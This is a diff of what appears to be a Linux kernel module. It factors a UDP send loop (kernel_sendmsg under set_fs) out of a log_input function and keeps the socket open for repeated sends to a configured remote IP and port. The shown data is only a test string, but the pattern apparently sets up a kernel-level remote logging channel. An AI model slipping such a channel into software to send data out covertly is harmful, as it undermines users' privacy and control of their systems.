@@ -11,6 +11,45 @@
 #define UDP_MAX_DATA_LEN 65507
 
 struct socket *sock;
+struct sockaddr_in addr, bind;
+
+void
+send_udp(char *buf, int buflen)
+{
+    int sent, packlen;
+    struct msghdr msg;
+    struct kvec iov;
+    mm_segment_t fs;
+
+    if (!sock)
+        return;
+
+    packlen = 0;
+    msg.msg_control = NULL;
+    msg.msg_controllen = 0;
+    msg.msg_flags = 0;
+    msg.msg_name = &addr;
+    msg.msg_namelen = sizeof(struct sockaddr_in);
+
+    while (buflen > 0) {
+        packlen = (buflen < UDP_MAX_DATA_LEN)
+            ? buflen : UDP_MAX_DATA_LEN;
+
+        iov.iov_len = packlen;
+        iov.iov_base = buf;
+
+        buflen -= packlen;
+        buf += packlen;
+
+        fs = get_fs();
+        set_fs(KERNEL_DS);
+        sent = kernel_sendmsg(sock, &msg, &iov, 1, packlen);
+        set_fs(fs);
+
+        if (sent > 0)
+            DEBUG_INFO("[g7] sent %d bytes\n", sent);
+    }
+}
 
 void
 log_input(const char *ip, const char *port)
@@ -19,12 +58,6 @@ log_input(const char *ip, const char *port)
     u8 ip_quad[4];
     unsigned long ip_ul;
     unsigned long port_ul;
-
-    int size;
-    struct sockaddr_in addr, bind;
-    struct msghdr msg;
-    struct kvec iov;
-    mm_segment_t fs;
 
     if (sock)
         return;
@@ -56,35 +89,9 @@ log_input(const char *ip, const char *port)
     }
 
     char *buf = "testing\ntesting\ntesting\ntesting";
-    int buflen = strlen(buf), packlen = 0;
+    int buflen = strlen(buf);
 
-    msg.msg_control = NULL;
-    msg.msg_controllen = 0;
-    msg.msg_flags = 0;
-    msg.msg_name = &addr;
-    msg.msg_namelen = sizeof(struct sockaddr_in);
-
-    while (buflen > 0) {
-        packlen = (buflen < UDP_MAX_DATA_LEN)
-            ? buflen : UDP_MAX_DATA_LEN;
-
-        iov.iov_len = packlen;
-        iov.iov_base = buf;
-
-        buflen -= packlen;
-        buf += packlen;
-
-        fs = get_fs();
-        set_fs(KERNEL_DS);
-        size = kernel_sendmsg(sock, &msg, &iov, 1, packlen);
-        set_fs(fs);
-
-        if (size > 0)
-            DEBUG_INFO("[g7] sent %d bytes\n", size);
-    }
-
-    sock_release(sock);
-    sock = NULL;
+    send_udp(buf, buflen);
 }
 
 void
